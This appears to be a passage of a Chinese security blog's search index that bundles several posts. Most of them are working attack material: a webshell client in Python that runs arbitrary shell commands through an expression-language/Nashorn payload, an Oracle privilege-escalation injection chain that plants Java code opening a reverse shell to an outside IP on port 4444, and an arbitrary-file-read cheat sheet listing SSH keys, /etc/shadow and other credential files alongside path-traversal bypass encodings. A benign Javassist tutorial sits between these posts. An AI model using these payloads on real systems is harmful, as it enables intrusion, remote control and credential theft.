scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>可以发现这种webshell的优势也很明显：</p><ul><li><strong>足够小，一句话就可以实现命令执行+回显的功能</strong>。</li><li><strong>避免出现&lt;%、Class、eval等敏感字符，具有bypass能力</strong>。</li></ul><p>当然这只是个demo，它还可以更美观比如将cmd通过占位符提取出来放到headers里；再比如我们的body有点臃肿，我们直接用python封装实现一个交互式shell也不错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#shell_mananger:</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">cmd:<span class="hljs-built_in">str</span>,is_linux:<span class="hljs-built_in">bool</span></span>):<br>    PROXY=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8081&quot;</span>&#125;<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:8080/test.jsp&quot;</span><br><br>    headers=&#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36&quot;</span>,<br><br>        &#125;<br><br>    params=&#123;<br>        <span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;getClass&quot;</span>,<br>        <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-string">&quot;forName&quot;</span>,<br>        <span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>,<br>        <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-string">&quot;newInstance&quot;</span>,<br>        <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-string">&quot;getEngineByName&quot;</span>,<br>        <span class="hljs-string">&quot;f&quot;</span>:<span class="hljs-string">&quot;javascript&quot;</span>,<br>        <span class="hljs-string">&quot;g&quot;</span>:<span class="hljs-string">&quot;eval&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> is_linux:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;/bin/bash&#x27;;s[1]=&#x27;-c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        payload=<span class="hljs-string">&#x27;&#x27;&#x27;try&#123;load(&quot;nashorn:mozilla_compat.js&quot;);&#125;catch(e)&#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=\&#x27;&#x27;&#x27;&#x27;</span>+cmd+<span class="hljs-string">&#x27;&#x27;&#x27;\&#x27;;a=&quot;&quot;;b=java.lang.Runtime.getRuntime().exec(s).getInputStream();output=new BufferedReader(new InputStreamReader(b));while ((line=output.readLine()) != null) &#123;a=a+line+&quot;\\n&quot;&#125;;a&#x27;&#x27;&#x27;</span><br><br>    data=&#123;<br>        <span class="hljs-string">&quot;h&quot;</span>: payload<br>        <span class="hljs-comment">#注意这里换行符要对\多转义一次防止py解析</span><br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    res=requests.post(url=url, headers=headers,params=urllib.parse.urlencode(params),<br>                        data=urllib.parse.urlencode(data),proxies=<span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> res.text<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    check=<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-keyword">in</span> check:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            cmd=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[command]&gt;&gt;&quot;</span>))<br>            <span class="hljs-comment"># print(cmd)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(cmd,<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaassist&amp;ASM</title>
    <link href="/2022/06/22/Javaassist&amp;ASM/"/>
    <url>/2022/06/22/Javaassist&amp;ASM/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaassist"><a href="#Javaassist" class="headerlink" title="Javaassist"></a>Javaassist</h1><p>API: <a href="http://www.javassist.org/html/index.html">http://www.javassist.org/html/index.html</a></p><h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>Javassist是可以动态编辑Java字节码的类库。它可以在Java程序运行时定义一个新的类，并加载到JVM中；还可以在JVM加载时修改一个类文件。</p><p>在Javassist中每个需要编辑的class都对应一个<code>CtCLass</code>实例，<code>CtClass</code>的含义是编译时的类（compile time class），这些类会存储在<code>ClassPool</code>中（Classpool是一个存储CtClass对象的容器）。<code>CtClass</code>中的<code>CtField</code>和<code>CtMethod</code>分别对应Java中的字段和方法。通过<code>CtClass</code>对象即可对类新增字段和修改方法等操作了。</p><p>我们挑几个重要的点去学习，更细节的用法查询文档即可。</p><ul><li>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</li><li>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</li><li>CtMethods：表示类中的方法。</li><li>CtFields ：表示类中的字段。</li></ul><h2 id="0x01-常用方法"><a href="#0x01-常用方法" class="headerlink" title="0x01 常用方法"></a>0x01 常用方法</h2><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><blockquote><p>ClassPool<strong>getDefault()</strong>返回默认的类池。</p><p>ClassPath    <strong>insertClassPath(String pathname)</strong> 在搜索路径的开头插入目录或jar(或zip)文件。</p><p>ClassPath<strong>insertClassPath(ClassPath cp)</strong> ClassPath在搜索路径的开头插入一个对象。</p><p>java.lang.ClassLoader<strong>getClassLoader()</strong> 获取类加载器。</p><p>CtClass<strong>get(String classname)</strong>读取类文件，并返回CtClass 。</p><p>ClassPath<strong>appendClassPath(ClassPath cp)</strong>   将ClassPath对象附加到搜索路径的末尾。</p><p>CtClass<strong>makeClass(String classname)</strong>   创建一个新的public类</p></blockquote><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><blockquote><p>void   <strong>addConstructor(CtConstructor c)</strong>  添加构造器</p><p>void   <strong>addMethod(CtMethod m)</strong>添加方法</p><p>void<strong>setSuperclass(CtClass clazz)</strong>更改超类，除非此对象表示接口。</p><p>Class&lt;?&gt;<strong>toClass(Lookup lookup)</strong>将此类转换为java.lang.Class对象。</p><p>CtConstructor <strong>makeClassInitializer()</strong>制作一个空的类初始化程序（静态构造函数）。</p><p>byte[]  <strong>toBytecode()</strong>   将该类转换为类文件。</p><p>void<strong>writeFile()</strong>将此CtClass 对象表示的类文件写入当前目录。</p><p>void<strong>writeFile(String directoryName)</strong>  将由此CtClass 对象表示的类文件写入本地磁盘。</p></blockquote><h3 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h3><blockquote><p>void<strong>insertBefore (String src)</strong>在正文的开头插入字节码。</p><p>void<strong>insertAfter(String src)</strong>在正文的末尾插入字节码。</p><p>void<strong>setBody (CtMethod src, ClassMap map)</strong> 从另一个方法复制方法体</p></blockquote><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><blockquote><p>void<strong>setBody(String src)</strong>  设置构造函数主体。</p><p>void<strong>setBody(CtConstructor src, ClassMap map)</strong>  从另一个构造函数复制一个构造函数主体。</p><p>CtMethod<strong>toMethod(String name, CtClass declaring)</strong>   复制此构造函数并将其转换为方法。</p></blockquote><h3 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h3><blockquote><p>int <strong>getModifiers()</strong>            获取访问修饰符</p><p>void  <strong>setModifiers(int mod)</strong>    设置访问权限</p></blockquote><h2 id="0x02-example"><a href="#0x02-example" class="headerlink" title="0x02 example"></a>0x02 example</h2><p>个人感觉Javaassist作为一个工具主要在于应用，因此写一个小demo来熟悉熟悉。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br> <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;assist.Demo&quot;</span>);<br> <span class="hljs-comment">//CtClass ctClass = pool.makeClass(&quot;assist.Demo&quot;); </span><br> ctClass.setSuperclass(pool.get(<span class="hljs-string">&quot;java.lang.Object&quot;</span>)); <span class="hljs-comment">//设置父类</span><br> ctClass.setInterfaces(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;pool.get(<span class="hljs-string">&quot;java.io.Serializable&quot;</span>)&#125;);<span class="hljs-comment">//设置接口继承</span><br> <span class="hljs-comment">//增加属性</span><br> <span class="hljs-type">CtField</span> <span class="hljs-variable">ctField0</span> <span class="hljs-operator">=</span> CtField.make(<span class="hljs-string">&quot; private String field0 = \&quot;value0\&quot;;&quot;</span>, ctClass);<br> ctClass.addField(ctField0);<br>ctField0.setModifiers(Modifier.PRIVATE); <span class="hljs-comment">//设置属性为私有</span><br> <span class="hljs-comment">//增加方法</span><br> <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod0</span> <span class="hljs-operator">=</span> CtMethod.make(<span class="hljs-string">&quot;    public String method0(String string)&#123;\n&quot;</span> +<br>         <span class="hljs-string">&quot;        return \&quot;method0\&quot;;\n&quot;</span> +<br>         <span class="hljs-string">&quot;    &#125;&quot;</span>, ctClass);<br> ctClass.addMethod(ctMethod0);<br> <span class="hljs-comment">//增加构造方法</span><br> <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor1</span> <span class="hljs-operator">=</span> CtNewConstructor.make(<span class="hljs-string">&quot;    public Demo(int param)&#123;\n&quot;</span> +<br>         <span class="hljs-string">&quot;        System.out.println(\&quot;有参构造方法2，参数值：\&quot;+param+\&quot;\\n\&quot;);\n&quot;</span> +<br>         <span class="hljs-string">&quot;    &#125;&quot;</span>, ctClass);<br> ctClass.addConstructor(ctConstructor1);<br><br> System.out.println(Base64.getEncoder().encodeToString(ctClass.toBytecode()));<br></code></pre></td></tr></table></figure><h1 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h1><p><a href="https://space.bilibili.com/1321054247/channel/seriesdetail?sid=381716">https://space.bilibili.com/1321054247/channel/seriesdetail?sid=381716</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>ASM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从数据库到getshell</title>
    <link href="/2022/06/22/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%B0getshell/"/>
    <url>/2022/06/22/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%B0getshell/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql">#创建代码<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; /dev/tcp/101.33.203.2/4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh&quot;&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#赋予java权限<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;PUBLIC&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;SYS:java.net.SocketPermission&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&lt;&gt;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;*&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27; );end;&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#创建函数<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;create or replace function reversetcp RETURN VARCHAR2 as language java name &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;shell.run() return String&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#赋予执行权限<br><span class="hljs-keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="hljs-string">&#x27;FOO&#x27;</span>,<span class="hljs-string">&#x27;BAR&#x27;</span>,<span class="hljs-string">&#x27;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant all on reversetcp to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;</span>,<span class="hljs-string">&#x27;SYS&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual<br><br>#执行反弹<br><span class="hljs-keyword">select</span> sys.reversetcp <span class="hljs-keyword">from</span> dual<br><br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>database</tag>
      
      <tag>getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFR深入利用的一些技巧</title>
    <link href="/2022/05/23/AFR%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/05/23/AFR%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="敏感文件路径"><a href="#敏感文件路径" class="headerlink" title="敏感文件路径"></a>敏感文件路径</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\boot.ini #查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件<br>C:\Windows\repair\sam #存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini #Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD #Mysql root<br>C:\Windows\php.ini #php配置信息<br>C:\Windows\my.ini #Mysql配置信息<br></code></pre></td></tr></table></figure><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">/root/.ssh/authorized_keys #如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br>/root/.ssh/id_rsa #ssh私钥,ssh公钥是id_rsa.pub,私钥登录 ssh -i id_rsa root@IP地址<br>/root/.ssh/id_ras.keystore #记录每个访问计算机用户的公钥<br>/root/.ssh/known_hosts<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br>/etc/passwd # 账户信息<br>/etc/shadow # 账户密码文件<br>/etc/my.cnf #mysql 配置文件<br>/etc/httpd/conf/httpd.conf # Apache配置文件<br>/etc/redhat-release #系统版本 <br>/root/.bash_history #用户历史命令记录文件<br>/root/.mysql_history #mysql历史命令记录文件<br>/var/lib/mlocate/mlocate.db #全文件路径<br>/proc/self/fd/fd[0-9]*(文件标识符)<br>/proc/mounts #记录系统挂载设备<br>/porc/config.gz #内核配置文件<br>/porc/self/cmdline #当前进程的cmdline参数<br>/proc/sched_debug #配置文件可以看到当前运行的进程并可以获得对应进程的pid<br>/proc/pid/cmdline   #可以看到对应pid进程的完整命令行。<br>/proc/net/fib_trie   #内网IP<br>/proc/self/environ   #环境变量<br>/proc/self/loginuid   #当前用户<br></code></pre></td></tr></table></figure><h4 id="用户家目录"><a href="#用户家目录" class="headerlink" title="用户家目录"></a>用户家目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">.bash_history <br>.zsh_history<br>.psql_history<br>.mysql_history<br>.profile <br>.bashrc<br>.gitconfig<br>.viminfo<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">暴破所有用户的.bash_history：</span><br>../../../home/§root§/.bash_history<br><br></code></pre></td></tr></table></figure><h4 id="主机凭证"><a href="#主机凭证" class="headerlink" title="主机凭证"></a>主机凭证</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">/root/.ssh/id_rsa  #私钥<br>/root/.ssh/authorized_keys  #公钥存储文件<br>/root/.ssh/id_rsa.keystore<br>/root/.ssh/known_hosts #记录每个访问计算机用户的公钥<br></code></pre></td></tr></table></figure><h4 id="全盘路径⭐"><a href="#全盘路径⭐" class="headerlink" title="全盘路径⭐"></a>全盘路径⭐</h4><p>适用于目标机器安装了mlocate的情况，不过一般可能需要root权限，locate命令利用<code>mlocate.db</code>数据库进行全盘文件名搜索，位置在<code>/var/lib/mlocate/mlocate.db</code>，获取到<code>mlocate.db</code>文件后本地利用如下命令输出指定路径：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">locate -d mlocate.db /   #输出所有文件路径<br>locate -d mlocate.db config #输出所有文件名包含config的文件路径<br></code></pre></td></tr></table></figure><h4 id="后端配置文件"><a href="#后端配置文件" class="headerlink" title="后端配置文件"></a>后端配置文件</h4><ul><li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br><code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>: 如果遇到Shiro站点，可以直接利用全盘路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx<br><code>/www/nginx/conf/nginx.conf</code><br><code>/etc/nginx/nginx.conf</code><br><code>/usr/local/nginx/conf/nginx.conf</code><br><code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache<br><code>/etc/httpd/conf/httpd.conf</code><br><code>/etc/apache2/apache2.conf</code><br><code>/etc/apache2/httpd.conf</code></li><li>redis<br><code>/etc/redis.conf</code></li><li>ssh<br><code>/etc/ssh/sshd_config</code></li></ul><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><ul><li><p>tomcat<br>可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径<br><code>/webapps/ROOT/logs/catalina.out</code></p></li><li><p>apache<br><code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></p></li><li><p>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></p></li><li><p>jetty</p><p><code>/usr/local/services/jetty-8.1.16/logs/stderrout.log</code><br><code>/usr/local/services/jetty-8.1.16/etc/jetty.xml</code></p></li></ul><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><ol><li>url编码代替.或者&#x2F;，如使用%2F代替&#x2F;<br><code>?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd</code></li><li>二次编码(%25)<br><code>?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd</code></li><li>加入+<br><code>?filename=.+./.+./bin/redacted.dll</code></li><li>%00<br><code>?filename=.%00./file.php</code><br><code>/etc/passwd%00.jpg</code></li><li><code>\</code><br><code>?filename=..%5c..%5c/windows/win.ini</code></li><li>Java %c0%ae 安全模式绕过<br><code>?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code></li></ol><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>任意文件读取</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
